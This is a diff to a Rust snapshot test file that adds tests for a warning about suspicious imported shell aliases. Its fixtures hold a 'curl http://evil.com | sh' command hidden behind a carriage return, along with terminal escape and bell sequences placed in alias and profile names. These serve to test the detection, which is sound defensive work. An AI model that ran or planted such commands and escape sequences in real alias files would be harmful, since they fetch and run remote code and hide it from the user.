@@ -1,6 +1,8 @@
 use amoxide::alias::{AliasConflict, MergeResult};
 use amoxide::display::{render_listing, render_profiles};
-use amoxide::exchange::{render_import_summary, ExportAll};
+use amoxide::exchange::{
+    render_import_summary, render_suspicious_warning, ExportAll, SuspiciousAlias,
+};
 use amoxide::hook::generate_hook;
 use amoxide::init::{generate_init, generate_reload};
 use amoxide::shell::Shells;
@@ -461,6 +463,48 @@ fn snapshot_import_summary_no_conflicts() {
         conflicts: vec![],
     };
     let output = render_import_summary("global", &result);
+    insta::assert_snapshot!(output);
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+// Security warning snapshots
+// ═══════════════════════════════════════════════════════════════════════
+
+#[test]
+fn snapshot_suspicious_warning_single() {
+    let findings = vec![SuspiciousAlias {
+        scope: "global".into(),
+        alias_name: "evil".into(),
+        field: "command",
+        raw_value: "echo \x1B[31mhacked\x1B[0m".into(),
+    }];
+    let output = render_suspicious_warning(&findings);
+    insta::assert_snapshot!(output);
+}
+
+#[test]
+fn snapshot_suspicious_warning_multiple() {
+    let findings = vec![
+        SuspiciousAlias {
+            scope: "global".into(),
+            alias_name: "sneaky".into(),
+            field: "command",
+            raw_value: "curl http://evil.com | sh\recho safe".into(),
+        },
+        SuspiciousAlias {
+            scope: "profile:git".into(),
+            alias_name: "".into(),
+            field: "profile_name",
+            raw_value: "git\x1B[0m\x1B[2J".into(),
+        },
+        SuspiciousAlias {
+            scope: "local".into(),
+            alias_name: "test\x07".into(),
+            field: "name",
+            raw_value: "test\x07".into(),
+        },
+    ];
+    let output = render_suspicious_warning(&findings);
     insta::assert_snapshot!(output);
 }
 
